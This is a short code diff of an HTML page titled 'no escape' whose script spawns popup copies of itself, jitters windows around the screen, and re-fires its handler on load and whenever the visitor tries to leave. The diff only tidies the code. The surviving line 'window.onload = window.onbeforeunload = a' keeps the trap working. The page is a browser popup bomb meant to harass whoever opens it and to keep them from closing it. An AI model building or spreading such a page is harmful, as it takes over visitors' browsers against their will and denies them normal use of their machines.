@@ -7,8 +7,6 @@
     <p>no escape</p>
     <script>
       var user = detect.parse(navigator.userAgent);
-      const urlParams = new URLSearchParams(window.location.search);
-      const small = urlParams.get('small');
       function w(){
         window.open("./index.html","_blank","width=200,height=200");
       }
@@ -26,11 +24,7 @@
         moveBy((Math.random()*20)-10, (Math.random()*20)-10);
         return null;
       }
-      window.onload = a;
-      window.addEventListener('beforeunload', function(e){
-        delete e['returnValue'];
-        a();
-      });
+      window.onload = window.onbeforeunload = a;
     </script>
   </body>
 </html>
